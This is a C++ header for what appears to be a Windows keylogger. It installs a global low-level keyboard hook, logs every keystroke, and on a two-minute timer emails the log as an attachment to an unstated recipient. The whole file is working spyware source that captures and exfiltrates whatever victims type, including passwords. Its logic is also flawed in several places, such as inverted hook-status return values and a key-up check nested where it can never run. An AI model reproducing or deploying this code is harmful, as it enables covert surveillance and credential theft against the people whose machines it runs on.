#ifndef HOOKS_H
#define HOOKS_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "Keys.h"
#include "Timer.h"
#include "Mail.h"

using namespace std;

namespace Hooks {
	
	string keylog = "";  // keystrokes stored - flushed when the email is sent
	
	void TimerSendmail() {
		// keystrokes string empty
		if(keylog.empty()) {
			return;
		}
		// writing the log file
		string last_file = IO::WriteLog(keylog);
		if(last_file.empty()) {
			Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
			return;
		}
		// send Email
		int x = Mail::SendMail("Log [" + last_file +"]", "Hi! :), \n File attached to this email", IO::GetPath(true) + last_file);
		if (x != 7) {
			Helper::WriteAppLog("Mail was not sent, Error Code " + Helper::ToString(x));
		} else {
			keylog = "";
		}
 	}
 	// triggering the email sended
 	Timer MailTimer(TimerSendmail, 2000 * 60, Timer::Infinite);
 	HHOOK eHook = NULL; // global variable <-> pointer
 	
 	// Windows API keyboard Hook
 	LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
 		if(nCode < 0) {
 			CallNextHookEx(eHook, nCode, wparam, lparam);
		}	
		// casting a pointer
		KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
		
		// check if a key is pressing and hold
		if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
			keylog += Keys::KEYS[kbs->vkCode].Name; // adding the Human Friendly Name for the Key
			if(kbs->vkCode == VK_RETURN) { // when hits "enter"
				keylog += '\n'; // new line
			} else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
				// evaluating when the key is up
				DWORD key = kbs->vkCode;
				if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || VK_SHIFT || VK_RSHIFT
				|| VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU 
				|| key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
					string KeyName = Keys::KEYS[kbs->vkCode].Name;
					KeyName.insert(1, "/");
					keylog += KeyName;
				}
				
			}
			
			return CallNextHookEx(eHook, nCode, wparam, lparam); 
		}
	}
 	
 	
 	bool InstallHook() {
 		// Starting a timer for logs and async actions
		Helper::WriteAppLog("Hook started");
		MailTimer.Start(true);
		// LL (Low Level) Hook (Global Hook) = 13
		// OurKeyboardProc = proceddure for the hook system everytime its a procedure
		// GetModuleHandle = obtaining instances
		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc, GetModuleHandle(NULL), 0);
		return eHook == NULL;
	}
 	
 	bool UninstallHook() {
		bool b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return (bool) b;
	}
	
	bool IsHooked() {
		return (bool)(eHook == NULL);
	}
 }

#endif
